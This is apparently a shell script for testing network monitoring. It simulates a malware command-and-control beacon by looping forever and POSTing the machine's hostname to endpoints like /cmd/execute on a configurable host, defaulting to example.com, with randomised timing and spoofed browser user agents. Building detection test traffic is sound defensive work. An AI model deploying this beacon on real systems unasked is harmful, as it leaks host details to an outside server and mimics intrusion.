#!/bin/sh

# Fake C2 Beacon Script for Network Monitoring Testing
# Simulates realistic malware beacon behavior

# Configuration (can be overridden by environment variables)
C2_SERVER="${C2_SERVER:-example.com}"
BASE_INTERVAL="${BASE_INTERVAL:-15}"
MAX_JITTER="${MAX_JITTER:-5}"

# User agents to rotate through (space-separated for Alpine sh compatibility)
USER_AGENTS="Mozilla/5.0_(Windows_NT_10.0;_Win64;_x64)_AppleWebKit/537.36 Mozilla/5.0_(Macintosh;_Intel_Mac_OS_X_10_15_7)_AppleWebKit/537.36 Mozilla/5.0_(X11;_Linux_x86_64)_AppleWebKit/537.36"

# C2 endpoints to simulate different malware families (space-separated)
ENDPOINTS="/malicious-request /api/checkin /update/config /beacon/status /cmd/execute"

# Generate random beacon ID
BEACON_ID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)

log_beacon() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] BEACON[$BEACON_ID]: $1"
}

get_random_jitter() {
    # Random jitter between 0 and MAX_JITTER seconds
    shuf -i 0-${MAX_JITTER} -n 1 2>/dev/null || echo $((RANDOM % MAX_JITTER))
}

get_random_user_agent() {
    # Select random user agent from space-separated list
    local agents="$USER_AGENTS"
    local count=$(echo $agents | wc -w)
    local index=$((RANDOM % count + 1))
    echo "$agents" | cut -d' ' -f$index | tr '_' ' '
}

get_random_endpoint() {
    # Select random endpoint from space-separated list
    local endpoints="$ENDPOINTS"
    local count=$(echo $endpoints | wc -w)
    local index=$((RANDOM % count + 1))
    echo "$endpoints" | cut -d' ' -f$index
}

send_beacon() {
    local endpoint=$(get_random_endpoint)
    local user_agent=$(get_random_user_agent)
    local url="https://${C2_SERVER}${endpoint}"
    
    # Simulate beacon payload
    local payload=$(cat <<EOF
{
    "beacon_id": "${BEACON_ID}",
    "timestamp": $(date +%s),
    "hostname": "$(hostname)",
    "os": "linux",
    "arch": "x64",
    "status": "active"
}
EOF
)
    
    log_beacon "Sending beacon to ${url}"
    
    # Send beacon with realistic headers
    curl -s \
        -H "User-Agent: ${user_agent}" \
        -H "Content-Type: application/json" \
        -H "Cache-Control: no-cache" \
        -H "Connection: keep-alive" \
        -X POST \
        -d "${payload}" \
        "${url}" \
        --connect-timeout 10 \
        --max-time 30 \
        >/dev/null 2>&1
    
    local exit_code=$?
    if [ $exit_code -eq 0 ]; then
        log_beacon "Beacon sent successfully"
    else
        log_beacon "Beacon failed (exit code: $exit_code)"
    fi
}

# Initial startup delay (1-3 seconds)
startup_delay=$((1 + RANDOM % 3))
log_beacon "Starting beacon with ID: ${BEACON_ID}"
log_beacon "C2 Server: ${C2_SERVER}"
log_beacon "Base interval: ${BASE_INTERVAL}s (jitter: 0-${MAX_JITTER}s)"
log_beacon "Startup delay: ${startup_delay}s"

sleep $startup_delay

# Main beacon loop
iteration=0
while true; do
    iteration=$((iteration + 1))
    
    log_beacon "Iteration ${iteration}"
    
    # Send beacon
    send_beacon
    
    # Calculate next interval with jitter
    jitter=$(get_random_jitter)
    next_interval=$((BASE_INTERVAL + jitter))
    
    log_beacon "Next beacon in ${next_interval} seconds"
    sleep $next_interval
done